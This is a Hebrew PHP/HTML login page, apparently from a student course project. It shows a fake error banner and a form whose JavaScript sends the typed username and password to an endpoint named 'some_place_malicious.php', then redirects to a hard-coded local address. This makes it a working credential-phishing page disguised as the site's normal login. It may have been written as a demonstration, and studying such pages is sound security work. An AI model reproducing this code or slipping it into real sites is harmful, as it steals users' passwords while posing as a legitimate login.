<?php
require_once('../classes/init.php');
require_once('../includes/header.php');
global $session;
?>

<html>
<head>
    <title>התחברות</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet"
          integrity="sha384-giJF6kkoqNQ00vy+HMDP7azOuL0xtbfIcaT9wjKHr8RbDVddVHyTfAAsrekwKmP1" crossorigin="anonymous">
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"
            integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous">
    </script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"
            integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous">
    </script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"
            integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous">
    </script>
    <link rel="stylesheet" href="../css/index.css">
    <link rel="stylesheet" type="text/css" href="../css/register.css">
</head>
<body dir="rtl">
<header>
    <section class="container-fluid">
        <div class="row">
            <div class="col-md-4 image-container">
                <img class="img-fluid logo " alt="header image" src="../assets/logo.png" style="max-width: 20%; height: 10vm" >
            </div>
            <div class="col-md-4 text-center">
                <h2 class="my-md-3 site-title">התחברות</h2>
            </div>
        </div>
    </section>
</header>
<main>
    <form>
        <div>
            אופס... משהו השתבש, אנה היכנס שנית
        </div>
        <div class="input-group">
            <label>שם משתמש</label>
            <input type="text" name="username" id="username" required>
        </div>
        <div class="input-group">
            <label>סיסמה</label>
            <input type="password" name="password" id="password">
        </div>
        <div class="input-group">
            <button type="button" class="btn1" value="login" onclick="login()">התחבר</button>
        </div>
        <p>
        <center>
            טרם נרשמת?
        </center>
        <a class="nav-link" href="register.php" align="center"> הירשם </a>
        <a class="nav-link" href="home.php" align="center"> חזרה לדף הבית </a>
        </p>
        <div id="info" class='alert alert-info'><strong></strong></div>
    </form>
    <script>
        function login(){
            console.log("login clicked")
            var username = document.getElementById("username").value
            var pass = document.getElementById("password").value
            if (!username || !pass){
                alert('אנא הזן שם משתמש וסיסמה')
                return;
            }
            var request = new XMLHttpRequest();
            request.onreadystatechange = function(){
                if (request.readyState===4 && request.status ===200){
                    console.log("ok")
                    console.log(request.response)
                    var response = JSON.parse(request.response);
                    window.location.href = "http://10.0.0.152:8888/";
                }
            }
            request.open("POST", 'some_place_malicious.php',true);
            request.setRequestHeader('Content-type','application/x-www-form-urlencoded');
            request.send("username=" + document.getElementById("username").value + "&password=" + document.getElementById("password").value)
        }
    </script>
</main>
<footer>
    <p class="footer"> פרויקט גמר בקורס תכנות צד שרת | מרצה ד"ר אורלי ברזילי | האקדמית תל אביב יפו <br>
        © כל הזכויות שמורות לקים פרח פרץ, הודיה כהן ואיזבל אלאשווילי ©</p>
    <br>
</footer>
</body>
</html>